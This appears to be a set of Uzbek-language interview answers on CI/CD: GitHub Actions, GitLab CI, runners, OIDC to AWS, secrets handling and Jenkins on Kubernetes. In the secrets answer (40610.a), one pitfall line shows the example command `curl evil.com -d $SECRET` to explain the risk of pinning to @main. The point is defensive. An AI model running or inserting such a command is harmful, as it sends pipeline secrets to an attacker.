40602.a:
**Qisqa javob:** Job — bitta runner (VM yoki konteyner) ichida ketma-ket bajariladigan step'lar to'plami; job'lar default parallel ishlaydi va bir-biridan izolyatsiyalangan. Step — job ichidagi bitta vazifa: shell buyruq (`run`) yoki action (`uses`); step'lar bir fayl tizimi va environment'ni bo'lishadi.

**Farq:**
| | Job | Step |
|---|---|---|
| Bajarilish | Alohida runner | Job runner'ida |
| Tartib | Default parallel, `needs` bilan ketma-ket | Har doim ketma-ket |
| Fayllar | Bo'lishmaydi (artifact kerak) | Bitta workspace |
| Ma'lumot uzatish | `outputs` + `needs.<job>.outputs` | `$GITHUB_ENV`, `$GITHUB_OUTPUT` |
| Yiqilsa | Bog'liq job'lar skip | Keyingi step'lar skip |

**Qanday ishlaydi:**
```
job: build (VM-1)            job: lint (VM-2)   <- parallel
  step1 checkout
  step2 go build -> ./bin    (VM-2 ./bin ni ko'rmaydi!)
  step3 echo "v=1.2" >> $GITHUB_OUTPUT
job: deploy (VM-3, needs: build) -> needs.build.outputs.version
```

**Amalda:**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.ver.outputs.version }}
    steps:
      - uses: actions/checkout@v4
      - id: ver
        run: echo "version=$(git describe --tags --always)" >> "$GITHUB_OUTPUT"
      - run: echo "BUILD_TIME=$(date -u +%s)" >> "$GITHUB_ENV"
      - run: echo "built at $BUILD_TIME"     # keyingi step ko'radi
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying ${{ needs.build.outputs.version }}"
```

**Tuzoqlar:**
- Bir step'da `export VAR=x` — keyingi step ko'rmaydi (har step yangi shell); `$GITHUB_ENV` ishlat.
- Job'ni juda mayda bo'lish — har job checkout va setup qayta (vaqt).
- Eskirgan `::set-output` sintaksisi — o'chirilgan, `$GITHUB_OUTPUT` ishlat.

**Senior nuqta:** Job chegarasi = izolyatsiya va parallelizm chegarasi. Turli huquq kerak bo'lgan ishlarni (build vs deploy) alohida job'ga ajrat — `permissions` va `environment` job darajasida beriladi.

40603.a:
**Qisqa javob:** Reusable workflow — `on: workflow_call` bilan e'lon qilingan workflow; boshqa workflow uni job sifatida `uses: org/repo/.github/workflows/x.yml@ref` orqali chaqiradi. Butun pipeline'ni (bir nechta job, environment, secret bilan) qayta ishlatish va tashkilot standartlarini markazlashtirish uchun.

**Muammo:** 80 ta repo'da bir xil build-scan-deploy YAML nusxasi. Xavfsizlik qadami qo'shish kerak — 80 PR.

**Qanday ishlaydi:**
```
app-repo/.github/workflows/ci.yml
   jobs.release.uses: acme/platform/.github/workflows/go-release.yml@v3
                                     |
platform-repo: go-release.yml (on: workflow_call)
   inputs, secrets -> jobs: test, build, scan, sign, deploy
```

**Amalda:**
```yaml
# acme/platform/.github/workflows/go-release.yml
on:
  workflow_call:
    inputs:
      service: { type: string, required: true }
      go-version: { type: string, default: '1.23' }
    secrets:
      REGISTRY_TOKEN: { required: true }
    outputs:
      digest: { value: '${{ jobs.build.outputs.digest }}' }
jobs:
  build:
    runs-on: ubuntu-latest
    outputs: { digest: '${{ steps.b.outputs.digest }}' }
    steps:
      - uses: actions/checkout@v4
      - id: b
        run: ./build.sh ${{ inputs.service }}
```
```yaml
# chaqiruvchi
jobs:
  release:
    uses: acme/platform/.github/workflows/go-release.yml@v3
    with: { service: api }
    secrets: { REGISTRY_TOKEN: '${{ secrets.REGISTRY_TOKEN }}' }
```

**Composite action'dan farqi:** reusable workflow — job darajasida (bir nechta job, o'z runner'i, environment); composite action — step darajasida.

**Tuzoqlar:**
- Ichma-ich chaqiruv chegarasi bor (hozir 10 daraja) va bitta workflow'dan chaqiriladigan reusable workflow'lar soni cheklangan.
- `env` kontekst chaqiruvchidan o'tmaydi — `inputs` orqali ber.
- `@main` ga bog'lash — platforma o'zgarishi hamma repo'ni birdan buzadi; tag/SHA ishlat.

**Senior nuqta:** Required workflows / repository rulesets bilan birlashtirilsa, tashkilot bo'yicha majburiy xavfsizlik bosqichlarini o'rnatish mumkin. Versiyalashni SemVer tag'lari bilan qil va changelog yurit.

40604.a:
**Qisqa javob:** Composite action — bir nechta step'ni (`run` va boshqa `uses`) bitta qayta ishlatiladigan step'ga birlashtiruvchi custom action. `action.yml` faylida `runs.using: composite` bilan e'lon qilinadi; Docker yoki JavaScript yozish shart emas.

**Muammo:** Har job'da bir xil 5 step: checkout, setup-go, cache, `go mod download`, lint tool o'rnatish. Composite action ularni bitta `uses: ./.github/actions/setup-go-env` ga aylantiradi.

**Qanday ishlaydi:**
```
job (runner)
  step: uses ./.github/actions/setup
          -> step a: setup-go
          -> step b: cache
          -> step c: run go mod download
  step: run make test      (bir xil runner va workspace)
```

**Amalda:**
```yaml
# .github/actions/setup/action.yml
name: Setup Go env
description: Go, cache va tool'larni o'rnatadi
inputs:
  go-version: { description: Go versiya, default: '1.23' }
outputs:
  cache-hit: { description: cache topildimi, value: '${{ steps.c.outputs.cache-hit }}' }
runs:
  using: composite
  steps:
    - uses: actions/setup-go@v5
      with: { go-version: '${{ inputs.go-version }}' }
    - id: c
      uses: actions/cache@v4
      with:
        path: ~/go/pkg/mod
        key: gomod-${{ hashFiles('**/go.sum') }}
    - run: go mod download
      shell: bash
```
```yaml
steps:
  - uses: actions/checkout@v4      # lokal action uchun avval checkout shart
  - uses: ./.github/actions/setup
    with: { go-version: '1.23' }
```

**Tuzoqlar:**
- `run` step'larida `shell:` majburiy — yozilmasa xato.
- Composite action ichida `secrets` kontekstiga to'g'ridan-to'g'ri kirish yo'q — `inputs` orqali ber.
- Log'da composite ichidagi step'lar bitta guruh bo'lib ko'rinadi — debug qiyinroq.

**Senior nuqta:** Step darajasidagi takrorlash — composite action; butun pipeline takrorlanishi — reusable workflow. Alohida repo'da versiyalab (`acme/actions/setup@v2`) tarqat.

40605.a:
**Qisqa javob:** Job'lar alohida runner'larda ishlaydi, fayl tizimi umumiy emas. Fayl uzatish: A job'da `actions/upload-artifact`, B job'da (`needs: A` bilan) `actions/download-artifact`. Kichik qiymatlar (versiya, digest) uchun esa job `outputs`.

**Qanday ishlaydi:**
```
job build (VM-1): go build -> dist/app -> upload-artifact (name: app)
                                              |
                                    GitHub artifact storage
                                              |
job test-e2e (VM-2, needs: build) -> download-artifact (name: app) -> dist/app
```

**Amalda:**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: go build -o dist/app ./cmd/app
      - uses: actions/upload-artifact@v4
        with:
          name: app-binary
          path: dist/app
          retention-days: 3
          if-no-files-found: error
  e2e:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: { name: app-binary, path: dist }
      - run: chmod +x dist/app && ./dist/app --selftest
```
Boshqa variantlar: Docker image'ni registry'ga push qilib keyingi job'da pull; katta fayllar uchun S3.

**Tuzoqlar:**
- Artifact fayl ruxsatlarini (execute bit) saqlamaydi — `chmod +x` yoki tar qilib yukla.
- `upload-artifact@v4` da bir run ichida bir xil `name` ga ikki marta yuklab bo'lmaydi (v3 da mumkin edi); matrix'da nomga `matrix` qiymatini qo'sh.
- v3 action'lar o'chirilgan — v4 ga o'tish shart.
- Cache'ni fayl uzatish uchun ishlatish — kafolat yo'q.

**Senior nuqta:** Artifact — bitta run ichidagi uzatish; muhitlar bo'ylab promote qilinadigan narsa registry'da bo'lsin. Katta artifact'lar saqlash xarajatini oshiradi — `retention-days` ni qisqa qo'y.

40606.a:
**Qisqa javob:** GitHub Actions'ni AWS'ga OIDC bilan ulash: AWS'da GitHub OIDC identity provider va trust policy'li IAM rol yaratiladi; workflow'da `permissions: id-token: write` beriladi va `aws-actions/configure-aws-credentials` rolni assume qilib vaqtinchalik credential oladi. Statik access key kerak emas.

**Qanday ishlaydi:**
```
job -> GitHub OIDC: JWT (sub=repo:acme/api:environment:prod, aud=sts.amazonaws.com)
    -> AWS STS AssumeRoleWithWebIdentity
    -> trust policy: issuer, aud, sub tekshiriladi
    -> 1 soatlik AccessKey/Secret/SessionToken -> env'ga
```

**Amalda:**
1. AWS'da provider (bir marta, Terraform):
```hcl
resource "aws_iam_openid_connect_provider" "github" {
  url            = "https://token.actions.githubusercontent.com"
  client_id_list = ["sts.amazonaws.com"]
}
```
2. Rol trust policy:
```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:acme/api:environment:production"
  }
}
```
3. Workflow:
```yaml
permissions: { id-token: write, contents: read }
jobs:
  deploy:
    environment: production
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-api-deploy
          aws-region: eu-central-1
      - run: aws sts get-caller-identity
```
`get-caller-identity` chiqishida `assumed-role/gha-api-deploy/GitHubActions` ko'rinsa — ishladi.

**Tuzoqlar:**
- `sub` shartisiz yoki `StringLike "repo:acme/*"` — har repo, har branch, PR ham prod rolini oladi.
- `id-token: write` faqat kerakli job'da bo'lsin, workflow darajasida emas.
- Xato `Not authorized to perform sts:AssumeRoleWithWebIdentity` — odatda `sub` mos emas; token claim'larini tekshir (environment ishlatilsa `sub` formati o'zgaradi).

**Senior nuqta:** Har muhit uchun alohida rol va minimal policy. CloudTrail'da session nomi orqali qaysi run qaysi API'ni chaqirganini kuzatish mumkin — audit uchun `role-session-name` ga run ID qo'y.

40607.a:
**Qisqa javob:** `needs` — job'lar orasidagi bog'liqlik: `needs: [build, test]` bo'lsa, job faqat `build` va `test` muvaffaqiyatli tugagach boshlanadi. U job'lardan DAG (yo'naltirilgan graf) yasaydi va oldingi job'ning `outputs` iga kirish beradi.

**Qanday ishlaydi:**
```
  lint ----+
           +--> build ---> deploy-staging ---> deploy-prod
  test ----+
(lint va test parallel; build ikkalasini kutadi)
```

**Amalda:**
```yaml
jobs:
  lint: { runs-on: ubuntu-latest, steps: [ { run: make lint } ] }
  test: { runs-on: ubuntu-latest, steps: [ { run: make test } ] }
  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    outputs: { tag: '${{ steps.t.outputs.tag }}' }
    steps:
      - id: t
        run: echo "tag=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
  notify:
    needs: [build]
    if: always()          # build yiqilsa ham ishlaydi
    runs-on: ubuntu-latest
    steps:
      - run: echo "build natijasi: ${{ needs.build.result }}, tag: ${{ needs.build.outputs.tag }}"
```
`needs.<job>.result` qiymatlari: `success`, `failure`, `cancelled`, `skipped`.

**Status funksiyalari:**
| `if:` | Qachon ishlaydi |
|---|---|
| (yo'q) = `success()` | Hamma `needs` muvaffaqiyatli |
| `always()` | Har doim (bekor qilinsa ham) |
| `failure()` | Biror oldingi yiqilsa |
| `!cancelled()` | Bekor qilinmagan bo'lsa |

**Tuzoqlar:**
- Oldingi job `skipped` bo'lsa, bog'liq job ham skip — zanjir bo'ylab tarqaladi. `if: ${{ !failure() && !cancelled() }}` bilan yechiladi.
- `always()` deploy job'ida — build yiqilsa ham deploy urinadi.
- Juda uzun ketma-ket zanjir — parallelizm yo'qoladi, pipeline sekin.

**Senior nuqta:** `needs` grafini kritik yo'l (critical path) nuqtai nazaridan loyihala: mustaqil tekshiruvlar parallel, faqat haqiqiy bog'liqlik ketma-ket.

40608.a:
**Qisqa javob:** `fail-fast` — `strategy` ostidagi sozlama: `true` (default) bo'lsa, matrix'dagi bitta job yiqilishi bilan qolgan ishlayotgan va navbatdagi matrix job'lar bekor qilinadi. `false` bo'lsa, hammasi oxirigacha ishlaydi va qaysi kombinatsiyalar buzilgani to'liq ko'rinadi.

**Qanday ishlaydi:**
```
matrix: node [20, 22, 24] x os [ubuntu, windows]
fail-fast: true
  (ubuntu,20) FAIL -> qolgan 5 job: cancelled
  natija: faqat bitta xato ko'rinadi, resurs tejaldi
fail-fast: false
  (ubuntu,20) FAIL, (windows,20) FAIL, boshqalar OK
  natija: "Node 20 da muammo" degan aniq rasm
```

**Amalda:**
```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 3
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]
    continue-on-error: ${{ matrix.node == 24 }}  # eksperimental versiya
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '${{ matrix.node }}' }
      - run: npm ci && npm test
```
GitLab'da ekvivalent tushuncha yo'q (har parallel job mustaqil); Jenkins'da `parallel` + `failFast true`.

**Qachon qaysi:**
| Holat | Tanlov |
|---|---|
| PR, tez feedback, qimmat runner | `true` |
| Kutubxona compat testi, nightly | `false` |
| Flaky platforma (Windows) | `false` + `continue-on-error` |

**Tuzoqlar:**
- `fail-fast: true` bilan bitta flaky job hamma natijani yashiradi.
- `continue-on-error` bilan yiqilgan job yashil ko'rinadi — buni "ishlayapti" deb o'ylash.
- `fail-fast` faqat matrix ichida ishlaydi, boshqa job'larga ta'sir qilmaydi.

**Senior nuqta:** Default'ga ko'r-ko'rona ishonma: debug qilish uchun to'liq rasm kerakmi yoki tez to'xtashmi — vaziyatga qarab tanla.

40609.a:
**Qisqa javob:** Environment — GitHub'da deploy maqsadini ifodalovchi nomlangan obyekt (`staging`, `production`). Unga protection rule'lar qo'yiladi: required reviewers (qo'lda tasdiq), wait timer, qaysi branch/tag deploy qila olishi, custom deployment protection rule'lar. Environment'ning o'z secret va variable'lari bor — faqat o'sha environment'ga deploy qiluvchi job ularni ko'radi.

**Qanday ishlaydi:**
```
job deploy-prod (environment: production)
   -> branch ruxsat etilganmi? (faqat main / v* tag)
   -> wait timer (masalan 10 daqiqa)
   -> required reviewers: @acme/sre dan 1 kishi Approve
   -> shundan keyin job boshlanadi va production secret'larini oladi
```

**Amalda:**
```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://api.example.com
    steps:
      - run: ./deploy.sh
        env:
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}   # production environment secret
```
Sozlash: Settings -> Environments -> production -> Required reviewers, Prevent self-review, Deployment branches and tags: `main`.
```bash
gh api repos/acme/api/environments/production
```
Repo'ning "Deployments" bo'limida har environment'ga qachon, qaysi commit chiqqani tarixi ko'rinadi.

**Tuzoqlar:**
- Prod secret'larini repo-level secret'ga qo'yish — har workflow (hatto PR) ularni o'qiy oladi. Environment secret'lari ishlat.
- Branch cheklovi yo'q — feature branch'dan prod'ga deploy.
- "Prevent self-review" o'chiq — dasturchi o'z deploy'ini o'zi tasdiqlaydi.
- Private repo'larda ba'zi protection rule'lar faqat ma'lum tariflarda mavjud.

**Senior nuqta:** Environment'ni OIDC bilan bog'la: AWS trust policy `sub: repo:acme/api:environment:production` — shunda prod credential'larini faqat tasdiqlangan job oladi. Bu ikki mustaqil himoya qatlamini birlashtiradi.

40610.a:
**Qisqa javob:** Reusable workflow'ga secret'lar avtomatik o'tmaydi. Ikki usul: `secrets: inherit` — chaqiruvchining barcha secret'lari o'tadi (qulay, lekin keng); yoki aniq ro'yxat — `secrets: { DB_PASSWORD: ${{ secrets.DB_PASS }} }`, chaqiriluvchi `on.workflow_call.secrets` da e'lon qiladi. Least privilege uchun aniq uzatish afzal.

**Qanday ishlaydi:**
```
caller (app repo) secrets: DB_PASS, NPM_TOKEN, SLACK_URL, AWS_KEY
   |
   +-- secrets: inherit       -> hammasi (4 ta) reusable'ga
   +-- secrets: DB_PASSWORD   -> faqat bittasi, nomi ham o'zgartirilishi mumkin
```

**Amalda:**
```yaml
# chaqiriluvchi: acme/platform/.github/workflows/deploy.yml
on:
  workflow_call:
    secrets:
      DB_PASSWORD:
        required: true
        description: Migratsiya uchun
jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - run: ./migrate.sh
        env: { DB_PASSWORD: '${{ secrets.DB_PASSWORD }}' }
```
```yaml
# chaqiruvchi
jobs:
  deploy:
    uses: acme/platform/.github/workflows/deploy.yml@v2
    secrets:
      DB_PASSWORD: ${{ secrets.PROD_DB_PASS }}
```
Environment secret'lari: reusable workflow ichidagi job `environment:` ni e'lon qilsa, o'sha environment secret'larini o'zi oladi.

**Tuzoqlar:**
- `secrets: inherit` + tashqi (boshqa tashkilot) reusable workflow — barcha secret'laringizni begona kodga berasiz. `inherit` faqat bir tashkilot ichida ishlaydi, lekin ichki repo ham buzilishi mumkin.
- Reusable workflow'ni `@main` bilan chaqirish — kimdir u yerga `curl evil.com -d $SECRET` qo'shsa.
- Secret nomlari chaqiruvchida boshqa — mapping noto'g'ri, bo'sh qiymat jim o'tadi; `required: true` qo'y.

**Senior nuqta:** Eng yaxshisi — secret umuman uzatmaslik: reusable workflow OIDC bilan o'zi credential olsin. Uzatish kerak bo'lsa — aniq ro'yxat va reusable workflow'ni SHA bilan pin.

40611.a:
**Qisqa javob:** `.gitlab-ci.yml` — repo ildizidagi GitLab CI/CD pipeline ta'rifi. Asosiy bloklar: `stages` (tartib), job'lar (`script`, `image`, `rules`, `needs`), `variables`, `default`, `cache`/`artifacts`, `include` (boshqa fayllar), `workflow` (pipeline qachon yaratilishi). GitLab Runner job'larni bajaradi.

**Tuzilma:**
```
.gitlab-ci.yml
  workflow:rules   -> pipeline umuman yaratiladimi
  include          -> shablonlar
  default          -> hamma job uchun image, before_script, retry
  variables
  stages: [lint, test, build, deploy]
  job'lar: stage + script + rules + needs + artifacts + environment
```

**Amalda:**
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

default:
  image: golang:1.23
  interruptible: true

stages: [test, build, deploy]

test:
  stage: test
  script: [ go test -race ./... ]

build:
  stage: build
  image: docker:27
  services: [ docker:27-dind ]
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

deploy_prod:
  stage: deploy
  environment: { name: production, url: https://api.example.com }
  resource_group: production
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
  script: [ ./deploy.sh $CI_COMMIT_SHA ]
```
Tekshirish: GitLab UI -> Build -> Pipeline editor (validate, merged YAML ko'rinishi); CLI: `glab ci lint`.

**Tuzoqlar:**
- `workflow:rules` siz — MR va branch uchun ikki pipeline (duplicate).
- `only/except` (eski) va `rules` ni bir job'da aralashtirish — ruxsat yo'q.
- Ichki registry, environment va variable'lar nativ — GitHub'dan ko'chirishda bularni qayta sozlash kerak.

**Senior nuqta:** Katta tashkilotda `include` bilan markaziy shablonlar va CI/CD Components (catalog) ishlat; compliance pipeline orqali majburiy job'larni loyiha egasi o'chira olmasin.

40612.a:
**Qisqa javob:** Stage — job'larning ketma-ket guruhi: `stages: [build, test, deploy]`. Bir stage ichidagi job'lar parallel ishlaydi; keyingi stage oldingi stage'dagi barcha job'lar muvaffaqiyatli tugaganda boshlanadi (agar `needs` ishlatilmasa).

**Qanday ishlaydi:**
```
stage build:   [build-api] [build-web]          parallel
                    \          /
                 hammasi OK?
                      v
stage test:    [unit] [integration] [lint]       parallel
                      v
stage deploy:  [deploy-staging]
```
Biror job yiqilsa — keyingi stage'lar boshlanmaydi (pipeline failed), `allow_failure: true` bo'lmasa.

**Amalda:**
```yaml
stages: [build, test, deploy]

build-api:
  stage: build
  script: [ make build-api ]
  artifacts: { paths: [ bin/ ] }

unit:
  stage: test
  script: [ make test ]

lint:
  stage: test
  script: [ make lint ]
  allow_failure: true      # yiqilsa ham deploy davom etadi (sariq)

deploy-staging:
  stage: deploy
  script: [ ./deploy.sh staging ]
```
Default stage'lar (e'lon qilinmasa): `.pre`, `build`, `test`, `deploy`, `.post`. `stage` ko'rsatilmagan job — `test`.

**Tuzoqlar:**
- Stage to'sig'i: sekin bitta job butun keyingi stage'ni kutdiradi — `needs` (DAG) bilan yechiladi.
- Artifact'lar default bo'yicha oldingi barcha stage'lardan yuklanadi — katta artifact'lar sekinlashtiradi; `dependencies: []` yoki `needs` bilan cheklash.
- Juda ko'p stage — pipeline grafigi o'qilmaydi va sekin.

**Senior nuqta:** Stage'lar mantiqiy ko'rinish uchun, `needs` esa haqiqiy tezlik uchun. Ko'p zamonaviy pipeline'larda stage'lar vizual guruhlash, bajarilish tartibi `needs` bilan boshqariladi.

40613.a:
**Qisqa javob:** `rules` — GitLab job'i pipeline'ga qo'shiladimi va qanday (`on_success`, `manual`, `delayed`, `never`) degan qarorni beruvchi shartlar ro'yxati. Shartlar: `if` (o'zgaruvchilar ifodasi), `changes` (o'zgargan fayllar), `exists` (fayl mavjudligi). Birinchi mos kelgan qoida qo'llanadi. Eskirgan `only/except` o'rnini bosgan.

**Qanday ishlaydi:**
```
job uchun rules yuqoridan pastga:
  rule1 mos? -> ha -> shu `when` bilan qo'shiladi, to'xta
  rule2 mos? -> ...
  hech biri mos emas -> job pipeline'da YO'Q
```

**Amalda:**
```yaml
deploy-prod:
  script: [ ./deploy.sh ]
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: never                      # MR'da hech qachon
    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/
      when: manual                     # release tag'da qo'lda
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: on_success

test-web:
  script: [ npm test ]
  rules:
    - changes:
        paths: [ web/**/* , package-lock.json ]
        compare_to: refs/heads/main

docker-build:
  rules:
    - exists: [ Dockerfile ]
  script: [ docker build . ]

nightly:
  rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"
  script: [ make e2e ]
```
Foydali o'zgaruvchilar: `CI_PIPELINE_SOURCE` (push, merge_request_event, schedule, web, api), `CI_COMMIT_BRANCH`, `CI_COMMIT_TAG`, `CI_DEFAULT_BRANCH`.

**Tuzoqlar:**
- Oxirgi qoida yo'q — kutilgan holatda job umuman paydo bo'lmaydi; tartib muhim.
- `changes` branch pipeline'da yangi branch uchun har doim `true` (solishtirish asosi yo'q) — `compare_to` ishlat.
- `when: manual` job'lar default `allow_failure: true` (rules ichida false) — pipeline holati chalkashadi.

**Senior nuqta:** Umumiy shartlarni YAML anchor yoki `!reference` bilan qayta ishlat. `workflow:rules` bilan duplicate pipeline'larni yo'qot — bu eng ko'p uchraydigan GitLab xatosi.

40614.a:
**Qisqa javob:** GitLab Runner — Go'da yozilgan ochiq kodli agent: GitLab'dan job'larni so'raydi (pull) va ularni executor orqali bajaradi. Asosiy executor'lar: Docker, Kubernetes, Shell, Docker Autoscaler/Instance (cloud VM'lar), SSH, VirtualBox. Runner'lar instance, group yoki project darajasida ro'yxatdan o'tadi va tag'lar bilan tanlanadi.

**Qanday ishlaydi:**
```
gitlab-runner (servis) --(HTTPS poll, outbound)--> GitLab: "job bormi?"
     job keldi (tags: [docker, linux])
     v
executor: docker -> image ichida konteyner -> clone -> script -> artifact yuklash
     v
log va status GitLab'ga qaytadi
```

**Amalda:**
```bash
# GitLab UI'da runner yaratib, auth token olinadi (glrt-...), keyin:
gitlab-runner register --non-interactive \
  --url https://gitlab.com --token glrt-XXXX \
  --executor docker --docker-image alpine:3.20
gitlab-runner list
gitlab-runner verify
```
```toml
# /etc/gitlab-runner/config.toml
concurrent = 8
[[runners]]
  name = "docker-1"
  executor = "docker"
  [runners.docker]
    image = "alpine:3.20"
    privileged = false
    volumes = ["/cache"]
```
```yaml
build:
  tags: [docker, linux]
  script: [ make build ]
```
Kubernetes'da: `gitlab-runner` Helm chart, har job — pod.

**Executor tanlash:**
| Executor | Qachon |
|---|---|
| Docker | Umumiy, izolyatsiya yaxshi |
| Kubernetes | Klaster bor, autoscale |
| Shell | Maxsus hardware, lekin izolyatsiya yo'q |
| Docker Autoscaler | Cloud VM'lar talabga qarab |

**Tuzoqlar:**
- Eski `registration token` bilan ro'yxatdan o'tish deprecated — yangi runner authentication token oqimi.
- Shell executor bir nechta loyiha uchun — bir job boshqasining fayl va credential'larini ko'radi.
- `privileged = true` dind uchun — konteyner host'ga to'liq kirish oladi.

**Senior nuqta:** Runner'larni ishonch darajasi bo'yicha ajrat: protected runner faqat protected branch'lar (prod deploy) uchun, umumiy runner — MR'lar uchun. Ephemeral executor (Kubernetes, autoscaler) holat oqishini yo'qotadi.

40615.a:
**Qisqa javob:** Auto DevOps — GitLab'ning tayyor CI/CD shabloni: loyiha tilini aniqlaydi (Cloud Native Buildpacks), image build qiladi, test, kod sifati, SAST/DAST/dependency/container scanning o'tkazadi va Kubernetes'ga (review apps, staging, production) Helm bilan deploy qiladi — `.gitlab-ci.yml` yozmasdan.

**Qanday ishlaydi:**
```
loyiha (.gitlab-ci.yml yo'q, Auto DevOps yoqilgan)
  -> Auto Build (Dockerfile bo'lsa u, bo'lmasa buildpacks)
  -> Auto Test, Auto Code Quality, Auto SAST, Auto Dependency Scanning,
     Auto Container Scanning, Auto Secret Detection
  -> Auto Review Apps (MR uchun)
  -> Auto Deploy (staging/production, Helm chart)
  -> Auto DAST, Auto Monitoring
```

**Amalda:**
Yoqish: Settings -> CI/CD -> Auto DevOps -> "Default to Auto DevOps pipeline". Kubernetes ulanishi (GitLab agent) va base domain kerak.
Qisman ishlatish — o'z pipeline'ingizga shablonni include qilib, kerakli qismini sozlash:
```yaml
include:
  - template: Auto-DevOps.gitlab-ci.yml

variables:
  POSTGRES_ENABLED: "false"
  TEST_DISABLED: "true"
  STAGING_ENABLED: "1"
  INCREMENTAL_ROLLOUT_MODE: manual
```
Yoki faqat xavfsizlik qismlari:
```yaml
include:
  - template: Jobs/SAST.gitlab-ci.yml
  - template: Jobs/Secret-Detection.gitlab-ci.yml
```

**Tuzoqlar:**
- "Sehrli" — nima bo'layotgani ko'rinmaydi, debug qiyin; buildpacks image'lari katta.
- Kubernetes va domen sozlanmagan — deploy job'lari yiqiladi.
- Production uchun to'liq Auto DevOps kamdan-kam mos keladi — odatda moslashtirish kerak bo'ladi.

**Senior nuqta:** Auto DevOps'ni boshlang'ich nuqta yoki xavfsizlik skanerlari manbai sifatida ishlat; mature jamoalar odatda alohida shablonlarni `include` qilib o'z pipeline'ini quradi.

40618.a:
**Qisqa javob:** JCasC (Jenkins Configuration as Code) — plugin bo'lib, Jenkins controller'ning butun konfiguratsiyasini (security realm, authorization, credential'lar, cloud/agent'lar, global tool'lar, plugin sozlamalari) Git'dagi YAML faylda deklarativ saqlash va start'da avtomatik qo'llash imkonini beradi.

**Muammo:** Jenkins UI'da 3 yil davomida qo'lda sozlangan: hech kim hammasini bilmaydi, server o'lsa qayta tiklash — kunlar; staging Jenkins prod'dan farq qiladi.

**Qanday ishlaydi:**
```
Git: jenkins.yaml + plugins.txt
     v
Docker image (jenkins/jenkins:lts-jdk21 + plugin'lar)
     v
start: CASC_JENKINS_CONFIG=/var/jenkins_home/casc/jenkins.yaml
     v
JCasC konfiguratsiyani qo'llaydi -> tayyor Jenkins
(o'zgarish = PR -> reload yoki yangi pod)
```

**Amalda:**
```yaml
jenkins:
  systemMessage: "Managed by JCasC - UI o'zgarishlari yo'qoladi"
  numExecutors: 0
  securityRealm:
    oic:
      clientId: jenkins
      clientSecret: "${OIDC_SECRET}"
      wellKnownOpenIDConfigurationUrl: https://sso.example.com/.well-known/openid-configuration
  authorizationStrategy:
    roleBased: { ... }
  clouds:
    - kubernetes:
        name: k8s
        namespace: jenkins-agents
credentials:
  system:
    domainCredentials:
      - credentials:
          - string: { id: slack-token, secret: "${SLACK_TOKEN}" }
unclassified:
  location: { url: https://jenkins.example.com/ }
```
`${OIDC_SECRET}` — env var yoki Kubernetes secret faylidan (secret'lar Git'da emas). Joriy holatni eksport: Manage Jenkins -> Configuration as Code -> View/Download.

**Tuzoqlar:**
- Secret'larni YAML'ga ochiq yozish.
- Plugin versiyalari qotirilmagan — JCasC sxemasi plugin bilan o'zgaradi va start yiqiladi.
- UI'da qo'lda o'zgartirish — keyingi reload'da yo'qoladi (bu yaxshi, lekin jamoa bilishi kerak).
- Job'lar JCasC'ning asosiy vazifasi emas — Job DSL plugin yoki Multibranch/Organization Folder bilan.

**Senior nuqta:** JCasC + plugins.txt + Job DSL + Kubernetes agent'lar = Jenkins'ni "cattle" qilish: controller'ni istalgan payt qayta yaratish mumkin, faqat build tarixi saqlanishi kerak.

40619.a:
**Qisqa javob:** Jenkins Kubernetes plugin — controller'ga build kerak bo'lganda Kubernetes'da agent pod yaratadi, pod ichidagi konteynerlarda step'larni bajaradi va build tugagach pod'ni o'chiradi. Har build toza, izolyatsiyalangan muhit oladi; doimiy agent VM'lari kerak emas.

**Qanday ishlaydi:**
```
build navbatda (label: go)
   v
controller -> kube-apiserver: pod yarat (podTemplate)
   pod: jnlp (agent, controller'ga ulanadi) + golang + docker/buildkit konteynerlari
   v
step'lar: container('golang') { sh 'go test' }
   v
build tugadi -> pod o'chiriladi
```

**Amalda:**
```groovy
pipeline {
  agent {
    kubernetes {
      yaml '''
apiVersion: v1
kind: Pod
spec:
  serviceAccountName: jenkins-agent
  containers:
    - name: golang
      image: golang:1.23
      command: ["sleep"]
      args: ["infinity"]
      resources:
        requests: { cpu: "1", memory: 1Gi }
        limits: { memory: 2Gi }
    - name: kaniko
      image: gcr.io/kaniko-project/executor:debug
      command: ["sleep"]
      args: ["infinity"]
'''
    }
  }
  stages {
    stage('Test') { steps { container('golang') { sh 'go test ./...' } } }
  }
}
```
```bash
kubectl get pods -n jenkins-agents -w     # agent pod paydo bo'lib yo'qolishini ko'r
```

**Tuzoqlar:**
- Konteynerda `command: sleep infinity` yo'q — konteyner darhol tugaydi, step'lar bajarilmaydi.
- `resources` yo'q — node'lar haddan tashqari yuklanadi, pod'lar OOMKilled.
